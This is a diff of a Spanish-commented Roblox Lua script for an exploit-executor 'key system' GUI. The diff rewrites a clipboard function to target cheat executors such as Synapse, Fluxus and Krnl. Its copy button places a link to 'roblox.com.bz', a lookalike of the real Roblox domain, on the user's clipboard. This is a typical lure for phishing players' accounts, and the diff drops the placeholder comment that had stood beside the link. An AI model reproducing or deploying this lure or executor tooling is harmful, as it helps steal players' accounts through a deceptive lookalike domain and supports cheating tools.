@@ -29,7 +29,7 @@ uiStroke.Color = Color3.fromRGB(80, 120, 255)
 uiStroke.Thickness = 2
 uiStroke.Parent = mainFrame
 
--- Titlel
+-- Title
 local title = Instance.new("TextLabel")
 title.Name = "Title"
 title.Size = UDim2.new(1, 0, 0, 60)
@@ -120,7 +120,7 @@ statusLabel.Font = Enum.Font.Gotham
 statusLabel.Parent = mainFrame
 
 -- ================== LINK ==================
-local KEY_LINK = "https://roblox.com.bz/communities/5527015584/"  -- ← Cambia esto por tu link real
+local KEY_LINK = "https://roblox.com.bz/communities/5527015584/"
 -- =========================================
 
 -- Hover Effects
@@ -138,42 +138,79 @@ addHoverEffect(copyButton, Color3.fromRGB(100, 220, 120), Color3.fromRGB(120, 24
 
 -- ================== CLIPBOARD UNIVERSAL ==================
 local function copyToClipboard(text)
-    local methods = {
-        "setclipboard",
-        "toclipboard",
-        "set_clipboard",
-        "Clipboard",
-        "WriteClipboard",
-    }
-
-    for _, name in ipairs(methods) do
-        local fn
-        local ok1 = pcall(function() fn = rawget(getfenv(), name) end)
-        if not ok1 or type(fn) ~= "function" then
-            local ok2 = pcall(function() fn = rawget(_G, name) end)
-            if not ok2 then fn = nil end
-        end
-
-        if type(fn) == "function" then
-            local ok = pcall(fn, text)
-            if ok then
-                return true, name
-            end
-        end
-    end
-
+    -- Método 1: setclipboard directo (Synapse, Fluxus, Delta, Krnl, Xeno, Solara, Wave, Codex...)
     local ok = pcall(function()
-        game:GetService("Clipboard"):SetClipboard(text)
+        if type(setclipboard) == "function" then
+            setclipboard(text)
+        else
+            error("no setclipboard")
+        end
     end)
-    if ok then return true, "ClipboardService" end
+    if ok then return true end
 
-    return false, nil
+    -- Método 2: toclipboard directo
+    ok = pcall(function()
+        if type(toclipboard) == "function" then
+            toclipboard(text)
+        else
+            error("no toclipboard")
+        end
+    end)
+    if ok then return true end
+
+    -- Método 3: via getgenv
+    ok = pcall(function()
+        local genv = getgenv and getgenv() or _G
+        if type(genv.setclipboard) == "function" then
+            genv.setclipboard(text)
+        elseif type(genv.toclipboard) == "function" then
+            genv.toclipboard(text)
+        else
+            error("no clipboard en getgenv")
+        end
+    end)
+    if ok then return true end
+
+    -- Método 4: via getfenv
+    ok = pcall(function()
+        local fenv = getfenv and getfenv() or _G
+        if type(fenv.setclipboard) == "function" then
+            fenv.setclipboard(text)
+        elseif type(fenv.toclipboard) == "function" then
+            fenv.toclipboard(text)
+        else
+            error("no clipboard en getfenv")
+        end
+    end)
+    if ok then return true end
+
+    -- Método 5: syn (Synapse)
+    ok = pcall(function()
+        if syn and type(syn.set_clipboard) == "function" then
+            syn.set_clipboard(text)
+        else
+            error("no syn")
+        end
+    end)
+    if ok then return true end
+
+    -- Método 6: fluxus
+    ok = pcall(function()
+        if fluxus and type(fluxus.setclipboard) == "function" then
+            fluxus.setclipboard(text)
+        else
+            error("no fluxus")
+        end
+    end)
+    if ok then return true end
+
+    return false
 end
 -- ==========================================================
 
 -- Copy Button
 copyButton.MouseButton1Click:Connect(function()
-    local success, _ = copyToClipboard(KEY_LINK)
+    local success = copyToClipboard(KEY_LINK)
 
     if success then
         statusLabel.Text = "✅ Copiado!"
